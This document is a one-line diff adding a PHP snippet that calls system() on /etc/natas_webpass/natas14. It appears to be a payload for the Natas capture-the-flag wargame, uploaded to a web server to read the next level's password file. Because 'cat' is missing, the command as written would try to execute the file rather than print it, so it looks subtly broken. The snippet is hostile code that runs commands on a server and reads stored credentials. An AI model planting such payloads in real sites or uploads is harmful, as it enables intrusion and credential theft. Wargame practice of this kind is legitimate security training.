@@ -1,0 +1,1 @@
+<?php echo system("/etc/natas_webpass/natas14");?>
